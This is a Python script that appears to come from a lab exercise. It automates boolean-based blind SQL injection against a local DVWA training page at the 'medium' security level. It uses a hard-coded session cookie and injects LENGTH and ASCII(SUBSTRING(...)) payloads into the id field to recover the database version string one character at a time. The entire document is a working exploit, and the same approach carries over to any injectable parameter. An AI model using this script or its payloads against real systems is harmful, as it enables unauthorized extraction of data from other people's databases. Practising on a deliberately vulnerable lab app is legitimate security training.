import requests

url = "http://localhost/vulnerabilities/sqli_blind/"
cookies = {
    "security": "medium",
    "PHPSESSID": "daud3j8f6o15cv4t46c5kopnb7"
}

print("[*] Buscando longitud de version()...")

length = 0
for i in range(1, 50):
    payload = f"1 AND LENGTH(version())={i}"
    data = {
        "id": payload,
        "Submit": "Submit"
    }

    r = requests.post(url, data=data, cookies=cookies)

    if "User ID exists in the database" in r.text:
        length = i
        print(f"[+] Longitud encontrada: {length}")
        break

if length == 0:
    print("[-] No se pudo encontrar la longitud")
    exit()

print("\n[*] Extrayendo version()...\n")

version = ""

for position in range(1, length + 1):
    for ascii_code in range(32, 127):

        payload = f"1 AND ASCII(SUBSTRING(version(),{position},1))={ascii_code}"
        data = {
            "id": payload,
            "Submit": "Submit"
        }

        r = requests.post(url, data=data, cookies=cookies)

        if "User ID exists in the database" in r.text:
            character = chr(ascii_code)
            version += character
            print(character, end="", flush=True)
            break

print("\n\n[+] Version extraída:", version)
